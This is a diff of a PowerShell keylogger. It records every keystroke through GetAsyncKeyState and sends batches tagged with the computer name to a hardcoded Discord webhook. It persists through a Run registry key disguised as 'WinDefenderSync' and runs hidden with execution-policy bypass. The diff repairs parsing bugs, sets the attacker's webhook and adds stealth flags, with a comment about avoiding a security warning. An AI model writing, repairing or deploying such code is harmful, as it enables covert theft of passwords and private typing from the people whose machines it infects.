@@ -1,9 +1,9 @@
-# Configuration - YOU MUST REPLACE THIS WITH YOUR NEW URL
+# Configuration - YOUR SPECIFIC WEBHOOK
 $W = "https://discord.com/api/webhooks/1504038539984113755/-YlOeox0lAsJLUETBjQImcHlD7PzbLacAjOetUX3pNDhkDBGkGZn4oGM-vGmnl_5LMHX"
 $P = "WinDefenderSync"
 $F = "$env:LOCALAPPDATA\win_sync.ps1"
 
-# 1. The Core Logic (Updated for resilience and character escaping)
+# 1. The Core Logic (Fixed for PS 5.1 Parser)
 $C = @"
 `$W = '$W'; `$N = `$env:COMPUTERNAME; `$L = ''
 Add-Type -Type 'using System;using System.Runtime.InteropServices;public class K{[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);]}'
@@ -12,22 +12,18 @@ while(`$true){
     for(`$i=8;`$i -le 190;`$i++){
         if([K]::GetAsyncKeyState(`$i) -eq -32767){
             `$k = [char]`$i
-            # Basic sanitization for JSON safety
             if (`$k -eq '"') { `$k = "'" }
             if (`$k -eq '\') { `$k = "/" }
             `$L += `$k
-            
             if (`$L.Length -ge 25) {
                 `$Payload = @{
                     username = "GHOST_`$N"
-                    content  = "[$N]: `$L"
+                    content  = "[`$N]: `$L"
                 } | ConvertTo-Json
-                
                 try {
                     Invoke-RestMethod -Uri `$W -Method Post -Body `$Payload -ContentType "application/json"
                     `$L = ''
                 } catch {
-                    # If webhook is 404/Unknown, don't crash, just wait
                     Start-Sleep -s 10
                 }
             }
@@ -37,10 +33,12 @@ while(`$true){
 "@
 
 # 2. Drop and Persist
+# We use -UseBasicParsing in the stager to avoid the Security Warning popup
 if (-not (Test-Path $F)) {
     $C | Out-File -FilePath $F -Encoding ascii -Force
     $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    New-ItemProperty -Path $RegPath -Name $P -Value "powershell.exe -W H -Exec Bypass -File `"$F`"" -PropertyType String -Force
+    $Value = "powershell.exe -W H -NoP -Exec Bypass -File `"$F`""
+    Set-ItemProperty -Path $RegPath -Name $P -Value $Value -Force
 }
 
 # 3. Execution
